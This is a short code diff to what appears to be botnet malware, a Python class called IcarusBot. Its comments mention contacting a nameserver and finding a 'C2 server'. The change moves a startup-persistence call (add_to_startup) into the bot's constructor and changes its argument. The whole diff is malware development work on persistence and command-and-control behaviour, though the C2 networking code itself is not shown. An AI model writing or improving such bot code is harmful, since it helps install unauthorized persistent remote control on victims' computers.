@@ -82,7 +82,7 @@ class IcarusBot:
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
-        add_to_startup(BOT_ID_NAME)
+        add_to_startup()
         while True:
             print("contacting nameserver")
             nameserver_available = False
@@ -384,7 +384,7 @@ def add_to_startup(file_path=""):
 
 #
 def main():
-    add_to_startup()
+
     IcarusBot()
 
 
